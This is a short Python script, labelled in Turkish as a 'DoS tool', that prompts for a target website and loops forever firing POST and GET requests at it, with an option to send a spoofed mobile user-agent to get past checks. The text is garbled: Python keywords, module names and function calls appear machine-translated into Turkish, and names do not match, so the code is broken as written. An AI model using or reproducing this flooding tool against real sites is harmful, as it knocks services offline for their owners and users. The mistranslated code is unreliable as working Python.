import requests as req

içe aktarma zamanı, sys, colorama

colorama import Fore, Back, Style

colorama.init()

headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, Gecko gibi) Chrome/52.0.2743.98 Mobile Safari/537.36'}

#user-agent ile doğrulamayı baypas etmesin

Yazdır( """

DoS aracı

1-user agnet li için

2 kullanıcılı agnetsiz

""")

sec = int(input("İşlem giriniz: "))

def hacker():

    attcak = input(Back.SARI+"Saldırı için (http/https) şeklinde: ")

    print(f"Saldırı olucak wrb sitesi ==> {attcak}")

    zaman.uyku(0.5)

    giden_p = 0

    Doğru iken:

        denemek:

            giden_p += 2

            zaman.uyku(0.1)

            print(Fore.RED +f"giden saldırı{giden_p} ==> {attcak}")

            req.post(attcak,başlıklar)

            req.get(attcak,başlıklar)

        hariç:

            print( Back.YELLOW +"DoS gönderirken hata lütfen bizimle bizimle geçin!")

            sistem.çıkış()

kesin hack():

    giden_p = 0

    attcak = input(Geri.SARI+"Saldı(http/https) şeklinde: ")

    print(f"Saldırı olucak web sitesi ==> {attcak}")

    zaman.uyku(0.5)

    Doğru iken:

        denemek:

            giden_p += 2

            zaman.uyku(0.1)

            print(Fore.RED+f"giden saldırı{giden_p} ==> {attcak}")

            istek.post(attcak)

            istek.get(attcak)

        hariç:

            print( Back.GREEN+"DoS gönderirken hata lütfen bizimle bizimle geçin!")

            sistem.çıkış()

eğer sn == 1:

    bilgisayar korsanı()

eğer saniye == 2:

    hile()
